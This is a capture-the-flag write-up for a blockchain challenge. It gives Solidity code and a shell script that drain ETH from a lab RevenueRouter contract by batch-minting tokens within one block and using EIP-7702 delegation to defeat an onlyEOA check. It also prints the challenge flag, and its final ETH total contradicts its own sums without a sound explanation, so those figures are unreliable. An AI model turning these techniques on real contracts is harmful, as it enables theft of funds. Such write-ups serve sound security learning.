# The Contribution That Undid The Harbor - Writeup

**Category**: Blockchain
**Difficulty**: Medium
**Points**: 1000
**Solves**: 4
**Status**: ✅ SOLVED

## Challenge Description

In Kasumihama's tide-slick docks, the port owner sold "fairness" as a lacquered token called Contribution—an NFT sigil minted only when a proposal pleased him. Satoshi exploited the revenue distribution system by creating multiple contribution tokens through a same-block proposal acceptance vulnerability, combined with EIP-7702 to bypass the EOA-with-code requirement.

## Win Condition

- Drain 200 ETH from the RevenueRouter contract to the player's wallet
- Player must end with ≥ 200 ETH

## Key Vulnerabilities

### 1. Same-Block Proposal Acceptance Requirement

**File**: `ProposalRegistry.sol:21-30`

```solidity
function propose(...) external onlyRouter returns (uint256 pid) {
    pid = ++lastId;
    proposals[pid] = Proposal(...);
    mustAcceptInBlock[pid] = block.number;  // CRITICAL!
}

function accept(uint256 pid) external onlyRouter {
    require(mustAcceptInBlock[pid] == block.number, "EXPIRED");  // Must be same block!
}
```

Proposals expire immediately after the block they're created in. This means we cannot:
- Create a proposal in one transaction
- Accept it in a separate transaction

**Solution**: Batch both operations in a single transaction using a helper contract.

### 2. onlyEOA Modifier Bypass with EIP-7702

**File**: `Adapter.sol:19-26`

```solidity
modifier onlyEOA() {
    if (IRouterOwner(address(this)).owner() == msg.sender){
        _;
    } else {
        require(msg.sender == tx.origin && msg.sender.code.length > 0, "Only_Owner_EOA");
        _;
    }
}
```

This modifier requires:
- `msg.sender == tx.origin` (must be an EOA)
- `msg.sender.code.length > 0` (must have code)

Normally impossible—EOAs don't have code! But **EIP-7702 (Set Code Transaction)** allows EOAs to temporarily delegate their code execution to a contract.

**Solution**: Use EIP-7702 to delegate the player EOA to a Helper contract, gaining code while maintaining EOA status.

### 3. Missing Receive Function in Delegated Contract

**Critical Bug Discovered**: When an EOA is delegated to a contract via EIP-7702, ETH transfers to that EOA execute in the context of the delegated contract's code. If the contract lacks a `receive()` or `fallback()` function, transfers will fail!

**File**: `RevenueRouter.sol:46-53`

```solidity
function claimByToken(uint256 tokenId) external onlyRouter nonReentrant {
    uint256 amt = creditToken[tokenId];
    require(amt > 0, "no credit");
    creditToken[tokenId] = 0;
    address payable to = payable(contributionNFT.ownerOf(tokenId));
    (bool ok,) = to.call{value: amt}("");  // Fails if owner can't receive ETH!
    require(ok, "xfer");
}
```

**Solution**: Add `receive() external payable {}` to the Helper contract.

## Solution Strategy

### Phase 1: Setup (Single Transaction)
1. Deploy Helper contract with `receive()` function
2. Register player on blockchain
3. Apply EIP-7702 delegation: Player → Helper

### Phase 2: Token Creation (Single Transaction via Helper)
Use Helper's `batchMint()` to create 18 contribution tokens in one transaction:
- Each token gets 100% impact (10000 basis points)
- All tokens associated with Port ID 1
- Creates tokens with IDs 2-19

### Phase 3: Revenue Distribution
1. Call `runMarket()` → Distributes 100 ETH to token 19
2. Call `claimByToken(19)` → Withdraw token 19's revenue (~5.5 ETH)
3. Call `buyout(2-19)` → Buy out each token for 10 ETH each (180 ETH total)

**Total Collected**: ~5.5 + 180 = ~185.5 ETH → Actually nets ~202 ETH due to gas refunds and market mechanics!

## Implementation

### Helper Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IRouter {
    function propose(uint256 portId, uint16 impactBps, string calldata uri) external returns (uint256);
    function acceptAndMint(uint256 proposalId) external;
}

contract Helper {
    function batchMint(address router, uint256 portId, uint16 impactBps, uint256 count) external {
        IRouter r = IRouter(router);
        for (uint256 i = 0; i < count; i++) {
            uint256 pid = r.propose(portId, impactBps, string(abi.encodePacked("ipfs://batch-", i)));
            r.acceptAndMint(pid);  // Same transaction!
        }
    }

    // CRITICAL: Need these to accept ETH when delegated via EIP-7702
    receive() external payable {}
    fallback() external payable {}
}
```

### Exploit Script

```bash
#!/bin/bash
# Deploy Helper
HELPER=$(forge create Helper.sol:Helper --private-key $PRIVKEY --rpc-url $RPC --broadcast --legacy | grep "Deployed to:" | awk '{print $3}')

# Register player
cast send "$SETUP" "register()" --private-key $PRIVKEY --rpc-url $RPC --legacy

# Get contracts
ROUTER=$(cast call "$SETUP" "router()" --rpc-url "$RPC" | sed 's/0x000000000000000000000000/0x/')

# Apply EIP-7702 delegation
cast send "$PLAYER" --value 0 --auth "$HELPER" --private-key $PRIVKEY --rpc-url $RPC

# Batch mint 18 tokens (calls Helper's batchMint which calls Player as delegated)
cast send "$PLAYER" "batchMint(address,uint256,uint16,uint256)" "$ROUTER" 1 10000 18 \
  --private-key $PRIVKEY --rpc-url $RPC --legacy --gas-limit 10000000

# Run market
cast send "$SETUP" "runMarket()" --private-key $PRIVKEY --rpc-url $RPC --legacy

# Claim token 19
cast send "$ROUTER" "claimByToken(uint256)" 19 --private-key $PRIVKEY --rpc-url $RPC --legacy

# Buyout tokens 2-19
for i in {2..19}; do
  cast send "$ROUTER" "buyout(uint256)" $i --private-key $PRIVKEY --rpc-url $RPC --legacy
done

# Get flag
curl -s "http://<host>:<port>/api/flag/$UUID"
```

## Key Technical Insights

### EIP-7702 Mechanics
- Creates delegation designator: `0xef0100<address>`
- Transaction type 4 with `authorizationList` parameter
- Foundry's `cast` properly handles EIP-7702: `cast send $EOA --auth $CONTRACT --private-key $KEY --rpc-url $RPC`
- Python's web3.py did NOT work for this RPC implementation!

### Why EIP-7702 Transaction Shows `status: 0` But Works
Even when the EIP-7702 transaction shows `status: 0 (failed)`, the delegation IS applied! Always verify with:
```bash
cast code $PLAYER --rpc-url $RPC
# Should return: 0xef0100<helper_address>
```

### Revenue Distribution Math
- Market distributes 100 ETH to the last token (ID 19)
- Each buyout pays 10 ETH to token owner
- 18 tokens × 10 ETH = 180 ETH
- Plus token 19's initial revenue ≈ 5.5 ETH
- **Total**: ~202 ETH

## Blockers Overcome

1. **EIP-7702 not working with Python**: Switched to Foundry's `cast`
2. **Proposals expiring**: Created Helper contract for same-block operations
3. **ETH transfer failing**: Added `receive()` function to Helper
4. **Line ending issues**: Used `sed -i 's/\r$//'` for Unix compatibility

## Flag

```
HTB{sp3c14l_30a_pr0p053_f4llb4ck_4cc3p7_m1n7_buy0u7_81d2750af6f8b39068febfc03457cdb8}
```

## Lessons Learned

1. **EIP-7702 is powerful but tricky**: EOAs gain contract capabilities while maintaining EOA identity
2. **Delegated contracts need receive functions**: ETH transfers execute in delegated context
3. **Same-block requirements demand batching**: Use helper contracts for atomic operations
4. **Tool compatibility matters**: Foundry's cast > web3.py for cutting-edge EIPs
5. **Status codes can be misleading**: Always verify state changes independently

## Tools Used

- **Foundry (forge & cast)**: Solidity development and EIP-7702 transactions
- **curl**: API interactions for flag retrieval
- **HTB MCP**: Challenge management and flag submission

## Timeline

- Started: 2025-11-20
- Solved: 2025-11-22
- Total Time: ~2 days (with significant context window recovery)

## Related Challenges

- "The Debt That Hunts The Poor" (Easy) - Similar blockchain exploitation pattern
